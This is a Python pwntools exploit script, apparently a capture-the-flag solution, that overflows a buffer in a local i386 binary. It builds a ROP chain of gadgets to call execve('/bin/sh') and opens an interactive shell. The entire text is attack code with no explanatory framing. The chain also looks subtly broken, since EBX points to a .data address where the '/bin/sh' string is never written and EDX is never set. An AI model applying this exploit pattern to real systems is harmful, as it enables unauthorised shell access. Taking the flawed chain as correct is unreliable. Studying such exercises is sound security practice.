#!/usr/bin/env python3
from pwn import *

# Config
context.arch = 'i386'
context.log_level = 'debug'

# ROP gadgets
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4

def build_rop_chain():
    # Initial buffer overflow - 16 bytes to reach return address
    rop = b"A" * 16

    # Stage 1: Set execve syscall number
    rop += p32(POP_EAX)
    rop += p32(0xb)
    
    # Stage 2: Set string pointer
    rop += p32(POP_EBX)
    rop += p32(0x0804c010)  # .data section
    
    # Stage 3: NULL out args
    rop += p32(POP_ECX)
    rop += p32(0)
    
    # Stage 4: Execute syscall
    rop += p32(INT_80)
    
    # Add /bin/sh string
    rop += b"/bin/sh\x00"
    
    return rop

def main():
    # Create process
    p = process('./rop1')
    
    # Send payload
    payload = build_rop_chain()
    print(f"Payload length: {len(payload)}")
    p.sendline(payload)
    
    # Interact
    p.interactive()

if __name__ == "__main__":
    main()
